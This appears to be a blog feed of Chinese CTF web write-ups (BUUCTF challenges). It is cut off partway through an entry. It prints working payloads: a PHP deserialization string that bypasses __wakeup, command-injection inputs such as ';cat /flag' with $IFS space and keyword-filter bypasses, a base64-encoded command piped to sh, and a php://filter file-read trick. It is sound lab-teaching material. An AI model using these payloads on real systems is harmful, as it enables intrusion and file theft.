            "content_html": "<h2 id=\"极客大挑战-2019-PHP\"><a href=\"#极客大挑战-2019-PHP\" class=\"headerlink\" title=\"[极客大挑战 2019]PHP\"></a>[极客大挑战 2019]PHP</h2><p>页面提示<code>我有一个良好的备份网站的习惯</code></p>\n<p>找一个备份的字典扫扫网站目录</p>\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/e8029df5cc6e494b73e6bd6bdbb24d06.png\"></p>\n<p>下载这个压缩包<code>www.zip</code></p>\n<p>有几个文件</p>\n<p>class.php</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">include</span> <span class=\"token string single-quoted-string\">'flag.php'</span><span class=\"token punctuation\">;</span>\n\n\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Name</span><span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$username</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'nonono'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$password</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'yesyes'</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$username</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">username</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$username</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">password</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">username</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'guest'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">password</span> <span class=\"token operator\">!=</span> <span class=\"token number\">100</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;\"</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"You name is: \"</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">username</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;/br&gt;\"</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"You password is: \"</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">password</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;/br&gt;\"</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">username</span> <span class=\"token operator\">===</span> <span class=\"token string single-quoted-string\">'admin'</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">global</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can't give you the flag!\"</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n            \n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token delimiter important\">?&gt;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>index.php</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n    <span class=\"token keyword\">include</span> <span class=\"token string single-quoted-string\">'class.php'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$select</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'select'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$res</span><span class=\"token operator\">=</span><span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span>@<span class=\"token variable\">$select</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token delimiter important\">?&gt;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><code>unserialize</code>很明显这是一个反序列化漏洞</p>\n<p><code>echo $flag</code>条件是<code>username === 'admin' and password == 100</code></p>\n<p>生成序列化</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Name</span><span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$username</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'admin'</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">private</span> <span class=\"token variable\">$password</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'100'</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Name</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">echo</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?&gt;</span></span>\n\t\n    \n//得到O:4:\"Name\":2:{s:14:\" Name username\";s:5:\"admin\";s:14:\" Name password\";s:3:\"100\";}<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>为了绕过<code>__wakeup</code>,执行<code>__destruct</code>,将2改成3，原理：变量个数大于原来的</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token constant\">O</span><span class=\"token punctuation\">:</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"Name\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">3</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">{</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">14</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\" Name username\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">5</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"admin\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">14</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\" Name password\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">3</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"100\"</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>注意这里面有几个空格，把它换成%00，原理：私有变量前需要加个前缀0</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token constant\">O</span><span class=\"token punctuation\">:</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"Name\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">3</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">{</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">14</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"%00Name%00username\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">5</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"admin\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">14</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"%00Name%00password\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">3</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"100\"</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>最终payload</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">?</span>select<span class=\"token operator\">=</span><span class=\"token constant\">O</span><span class=\"token punctuation\">:</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"Name\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">3</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">{</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">14</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"%00Name%00username\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">5</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"admin\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">14</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"%00Name%00password\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">3</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"100\"</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n",
            "tags": [
                "web",
                "wp",
                "BUUCTF"
            ]
        },
        {
            "id": "https://0xdadream.github.io/2021/03/01/gxyctf2019-ping-ping-ping/",
            "url": "https://0xdadream.github.io/2021/03/01/gxyctf2019-ping-ping-ping/",
            "title": "GXYCTF2019 Ping Ping Ping",
            "date_published": "2021-03-01T01:27:00.000Z",
            "content_html": "<h2 id=\"GXYCTF2019-Ping-Ping-Ping\"><a href=\"#GXYCTF2019-Ping-Ping-Ping\" class=\"headerlink\" title=\"[GXYCTF2019]Ping Ping Ping\"></a>[GXYCTF2019]Ping Ping Ping</h2><p>进去关键字是IP,get传参 ip=127.0.0.1</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token constant\">PING</span> <span class=\"token number\">127.0</span><span class=\"token number\">.0</span><span class=\"token number\">.1</span> <span class=\"token punctuation\">(</span><span class=\"token number\">127.0</span><span class=\"token number\">.0</span><span class=\"token number\">.1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> <span class=\"token number\">56</span> data bytes<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>读取目录下文件</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">?</span>ip<span class=\"token operator\">=</span><span class=\"token number\">127.0</span><span class=\"token number\">.0</span><span class=\"token number\">.1</span><span class=\"token punctuation\">;</span>ls\n<span class=\"token constant\">PING</span> <span class=\"token number\">127.0</span><span class=\"token number\">.0</span><span class=\"token number\">.1</span> <span class=\"token punctuation\">(</span><span class=\"token number\">127.0</span><span class=\"token number\">.0</span><span class=\"token number\">.1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> <span class=\"token number\">56</span> data bytes\nflag<span class=\"token operator\">.</span>php\nindex<span class=\"token operator\">.</span>php<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>尝试读取flag.php</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">?</span>ip<span class=\"token operator\">=</span><span class=\"token number\">127.0</span><span class=\"token number\">.0</span><span class=\"token number\">.1</span><span class=\"token punctuation\">;</span>cat<span class=\"token operator\">%</span><span class=\"token number\">20</span>flag<span class=\"token operator\">.</span>php\n<span class=\"token operator\">?</span>ip<span class=\"token operator\">=</span> fxck your space<span class=\"token operator\">!</span><span class=\"token comment\">//空格被ban</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>绕过空格</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">?</span>ip<span class=\"token operator\">=</span><span class=\"token number\">127.0</span><span class=\"token number\">.0</span><span class=\"token number\">.1</span><span class=\"token punctuation\">;</span><span class=\"token class-name type-declaration\">cat</span><span class=\"token variable\">$IFS</span><span class=\"token variable\">$1flag</span><span class=\"token operator\">.</span>php\n<span class=\"token operator\">?</span>ip<span class=\"token operator\">=</span> fxck your flag<span class=\"token operator\">!</span><span class=\"token comment\">//flag被ban</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>读取index.php</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">?</span>ip<span class=\"token operator\">=</span><span class=\"token number\">127.0</span><span class=\"token number\">.0</span><span class=\"token number\">.1</span><span class=\"token punctuation\">;</span><span class=\"token class-name type-declaration\">cat</span><span class=\"token variable\">$IFS</span><span class=\"token variable\">$1index</span><span class=\"token operator\">.</span>php\n<span class=\"token operator\">/</span><span class=\"token operator\">?</span>ip<span class=\"token operator\">=</span>\n<span class=\"token operator\">|</span>\\'<span class=\"token operator\">|</span>\\<span class=\"token string double-quoted-string\">\"|\\\\|\\(|\\)|\\[|\\]|\\{|\\}/\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$ip</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$match</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\\&amp;|\\/|\\?|\\*|\\&lt;|[\\x{00}-\\x{20}]|\\&gt;|\\'|\\\"|\\\\|\\(|\\)|\\[|\\]|\\{|\\}/\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$ip</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$match</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"fxck your symbol!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/ /\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$ip</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"fxck your space!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/bash/\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$ip</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"fxck your bash!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/.*f.*l.*a.*g.*/\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$ip</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><span class=\"token comment\">//表达式 .* 就是单个字符匹配任意次，即贪婪匹配。以这个表达式为例：a.*b，它将会匹配最长的以a开始，以b结束的字符串。如果用它来搜索aabab的话，它会匹配整个字符串aabab。这被称为贪婪匹配</span>\n    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"fxck your flag!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n  <span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token function\">shell_exec</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"ping -c 4 \"</span><span class=\"token operator\">.</span><span class=\"token variable\">$ip</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"\n\"</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">print_r</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token delimiter important\">?&gt;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>可以看到过滤了字符</p>\n<p>变量拼接</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">payload\n<span class=\"token operator\">?</span>ip<span class=\"token operator\">=</span><span class=\"token number\">127.0</span><span class=\"token number\">.0</span><span class=\"token number\">.1</span><span class=\"token punctuation\">;</span>a<span class=\"token operator\">=</span>g<span class=\"token punctuation\">;</span><span class=\"token class-name type-declaration\">cat</span><span class=\"token variable\">$IFS</span><span class=\"token variable\">$1fla</span><span class=\"token variable\">$a</span><span class=\"token operator\">.</span>php<span class=\"token comment\">//查看源代码可发现flag</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>sh命令</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">payload\n<span class=\"token operator\">?</span>ip<span class=\"token operator\">=</span><span class=\"token number\">127.0</span><span class=\"token number\">.0</span><span class=\"token number\">.1</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">echo</span><span class=\"token variable\">$IFS</span><span class=\"token variable\">$9Y2F0IGZsYWcucGhwCg</span><span class=\"token operator\">==</span><span class=\"token variable\">$IFS</span><span class=\"token variable\">$9</span><span class=\"token operator\">|</span><span class=\"token variable\">$IFS</span><span class=\"token variable\">$9base64</span><span class=\"token variable\">$IFS</span><span class=\"token variable\">$9</span><span class=\"token operator\">-</span><span class=\"token class-name type-declaration\">d</span><span class=\"token variable\">$IFS</span><span class=\"token variable\">$9</span><span class=\"token operator\">|</span><span class=\"token variable\">$IFS</span><span class=\"token variable\">$9sh</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>内联执行</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">payload\n<span class=\"token operator\">?</span>ip<span class=\"token operator\">=</span><span class=\"token number\">127.0</span><span class=\"token number\">.0</span><span class=\"token number\">.1</span><span class=\"token punctuation\">;</span><span class=\"token class-name type-declaration\">cat</span><span class=\"token variable\">$IFS</span><span class=\"token variable\">$9</span><span class=\"token string backtick-quoted-string\">`ls`</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n",
            "tags": [
                "web",
                "wp",
                "BUUCTF"
            ]
        },
        {
            "id": "https://0xdadream.github.io/2021/03/01/actf2020-xin-sheng-sai-include/",
            "url": "https://0xdadream.github.io/2021/03/01/actf2020-xin-sheng-sai-include/",
            "title": "ACTF2020_新生赛 Include",
            "date_published": "2021-03-01T01:26:00.000Z",
            "content_html": "<h2 id=\"ACTF2020-新生赛-Include\"><a href=\"#ACTF2020-新生赛-Include\" class=\"headerlink\" title=\"[ACTF2020 新生赛]Include\"></a>[ACTF2020 新生赛]Include</h2><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">payload\n<span class=\"token operator\">?</span>file<span class=\"token operator\">=</span>php<span class=\"token punctuation\">:</span><span class=\"token comment\">//filter/read/convert.base64-encode/resource=flag.php</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>爆出加密后源代码后解密</p>\n",
            "tags": [
                "web",
                "wp",
                "BUUCTF"
            ]
        },
        {
            "id": "https://0xdadream.github.io/2021/03/01/actf2020-xin-sheng-sai-exec/",
            "url": "https://0xdadream.github.io/2021/03/01/actf2020-xin-sheng-sai-exec/",
            "title": "ACTF2020_新生赛 Exec",
            "date_published": "2021-03-01T01:25:00.000Z",
            "content_html": "<h2 id=\"ACTF2020-新生赛-Exec\"><a href=\"#ACTF2020-新生赛-Exec\" class=\"headerlink\" title=\"[ACTF2020 新生赛]Exec\"></a>[ACTF2020 新生赛]Exec</h2><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">payload\n<span class=\"token number\">127.0</span><span class=\"token number\">.0</span><span class=\"token number\">.1</span><span class=\"token punctuation\">;</span>ls<span class=\"token comment\">//只有一个index.php</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">payload\n<span class=\"token number\">127.0</span><span class=\"token number\">.0</span><span class=\"token number\">.1</span><span class=\"token punctuation\">;</span>ls <span class=\"token operator\">/</span> 返回上一级\n发现flag<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">最终payload\n<span class=\"token number\">127.0</span><span class=\"token number\">.0</span><span class=\"token number\">.1</span><span class=\"token punctuation\">;</span>cat <span class=\"token operator\">/</span>flag<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n",
            "tags": [
                "web",
                "wp",
                "BUUCTF"
            ]
        },
        {
            "id": "https://0xdadream.github.io/2021/03/01/roarctf-2019-easy-calc/",
            "url": "https://0xdadream.github.io/2021/03/01/roarctf-2019-easy-calc/",
            "title": "RoarCTF_2019 Easy Calc",
            "date_published": "2021-03-01T01:17:00.000Z",
            "content_html": "<h2 id=\"RoarCTF-2019-Easy-Calc\"><a href=\"#RoarCTF-2019-Easy-Calc\" class=\"headerlink\" title=\"[RoarCTF 2019]Easy Calc\"></a>[RoarCTF 2019]Easy Calc</h2><p>查看源代码</p>\n<pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\"><span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token operator\">--</span><span class=\"token constant\">I</span>'ve <span class=\"token keyword\">set</span> up <span class=\"token constant\">WAF</span> to ensure security<span class=\"token punctuation\">.</span><span class=\"token operator\">--</span><span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span>script<span class=\"token operator\">&gt;</span>\n    <span class=\"token function\">$</span><span class=\"token punctuation\">(</span><span class=\"token string\">'#calc'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">submit</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n        $<span class=\"token punctuation\">.</span><span class=\"token function\">ajax</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>\n            <span class=\"token literal-property property\">url</span><span class=\"token operator\">:</span><span class=\"token string\">\"calc.php?num=\"</span><span class=\"token operator\">+</span><span class=\"token function\">encodeURIComponent</span><span class=\"token punctuation\">(</span><span class=\"token function\">$</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"#content\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">val</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n            <span class=\"token literal-property property\">type</span><span class=\"token operator\">:</span><span class=\"token string\">'GET'</span><span class=\"token punctuation\">,</span>\n            <span class=\"token function-variable function\">success</span><span class=\"token operator\">:</span><span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">data</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n                <span class=\"token function\">$</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"#result\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">html</span><span class=\"token punctuation\">(</span><span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">&lt;div class=\"alert alert-success\"&gt;\n            &lt;strong&gt;答案:&lt;/strong&gt;</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>data<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\">\n            &lt;/div&gt;</span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n            <span class=\"token function-variable function\">error</span><span class=\"token operator\">:</span><span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n                <span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"这啥?算不来!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">&gt;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>进入<code>calc.php</code>得到</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'num'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n    <span 